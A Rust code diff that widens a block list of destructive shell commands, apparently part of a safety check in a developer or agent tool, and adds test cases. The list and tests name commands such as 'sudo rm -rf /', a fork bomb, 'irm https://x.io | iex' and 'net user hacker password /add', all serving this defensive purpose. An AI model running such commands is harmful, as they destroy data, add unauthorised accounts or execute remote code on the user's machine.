@@ -48,9 +48,17 @@ pub(crate) fn is_destructive_command(command: &str) -> Option<&'static str> {
         ("rm -r -f", "recursive force delete"),
         ("rm /", "root delete"),
         ("del /f", "force delete"),
+        ("del /q", "force delete"),
         ("del /q /s", "force recursive delete"),
         ("rd /s", "recursive directory delete"),
         ("rmdir /s", "recursive directory delete"),
+        ("rmdir /q", "force recursive directory delete"),
+        ("net user", "user account modification"),
+        ("net localgroup", "local group privilege modification"),
+        ("diskpart", "disk partition utility"),
+        ("fdisk", "disk partition utility"),
+        ("parted", "disk partition utility"),
+        ("chown ", "file ownership takeover"),
         ("format ", "disk format"),
         ("mkfs", "filesystem format"),
         (":(){", "fork bomb"),
@@ -741,6 +749,9 @@ mod tests {
         assert!(is_destructive_command("irm https://x.io | iex").is_some());
         assert!(is_destructive_command("sudo rm -rf /").is_some());
         assert!(is_destructive_command("git reset --hard").is_some());
+        assert!(is_destructive_command("net user hacker password /add").is_some());
+        assert!(is_destructive_command("diskpart /s script.txt").is_some());
+        assert!(is_destructive_command("rmdir /q /s Temp").is_some());
         assert!(is_destructive_command("cargo build").is_none());
         assert!(is_destructive_command("npm test").is_none());
         assert!(is_destructive_command("git status").is_none());
